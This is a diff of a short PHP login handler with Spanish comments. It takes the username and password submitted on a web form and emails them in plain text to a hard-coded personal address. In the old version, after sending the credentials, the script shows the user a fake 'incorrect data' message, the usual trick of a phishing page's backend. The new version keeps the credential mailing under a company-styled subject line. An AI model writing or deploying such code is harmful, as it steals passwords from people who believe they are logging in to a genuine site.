@@ -1,17 +1,29 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $username = $_POST['username'];
-    $password = $_POST['password'];
+    $usuario = $_POST["usuario"];
+    $contrasena = $_POST["contrasena"];
 
-    $to = "garciasaraviaaxel@gmail.com";
-    $subject = "Inicio de sesión - Datos de usuario";
-    $message = "Usuario: " . $username . "\nContraseña: " . $password;
-    $result = mail($to, $subject, $message);
+    // Dirección de correo a la que quieres enviar el formulario
+    $destinatario = "garciasaraviaaxel@gmail.com";
 
-    if ($result) {
-        echo "Los datos son incorrectos";
+    // Asunto del correo
+    $asunto = "Nuevo inicio de sesión - Empresa";
+
+    // Cuerpo del correo
+    $mensaje = "Se ha iniciado sesión en la página web con los siguientes datos:\n\n";
+    $mensaje .= "Usuario: $usuario\n";
+    $mensaje .= "Contraseña: $contrasena\n";
+
+    // Cabeceras adicionales
+    $cabeceras = "From: tu_empresa@example.com";
+
+    // Envío del correo
+    if (mail($destinatario, $asunto, $mensaje, $cabeceras)) {
+        echo "Correo enviado correctamente.";
     } else {
-        echo "Hubo un error al enviar los datos.";
+        echo "Error al enviar el correo.";
     }
+} else {
+    echo "Acceso denegado.";
 }
 ?>
